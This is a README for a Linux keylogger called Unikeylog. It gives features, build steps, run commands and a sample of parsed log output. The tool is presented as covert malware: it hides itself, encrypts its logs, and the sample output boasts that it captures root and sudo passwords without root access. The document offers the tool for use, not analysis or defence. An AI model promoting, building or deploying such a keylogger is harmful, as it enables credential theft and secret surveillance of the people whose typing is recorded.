# Unikeylog - multifunctional keylogger for Linux systems

## Features:
 - X11 key logging (doesn't require root)
 - /dev/input key logging (requires root)
 - encryption of log
 - hides itself

## Dependencies
 - C compiler GCC
 - Xlib
 - openssl (library + command line tool)
 - LuaJIT

## Build

Run `luajit build.lua` and follow the instructions.

## Usage

After you run `luajit build.lua`, see file `src/keylogger.exe`. This application is the keylogger. It runs silently logging to the logfile specified at the compile time (option KEYLOGGER_LOGFILE). Current date and time are appended to the name of logfile.

To read logfile, `cd` to directory `src/` and run `luajit parser.lua < logfile`.

## Example

Build for X11:
```bash
$ KEYLOGGER_MODE=X11 lua build.lua
```

Run:
```bash
$ ./keylogger.exe
```

Parse log:
```bash
$ luajit parser.lua < log.Sun_May_10_08-51-01_2015
ls
<Shift_R>This keylogger runs without rot<BackSpace>ot access, but in can intercept root or sudo password
su

<Shift_R>Also, we can yo<BackSpace><BackSpace>use other layouts, for example, <Shift_R>Russian. <Shift_R>Проверка работы русской раскладки.
```
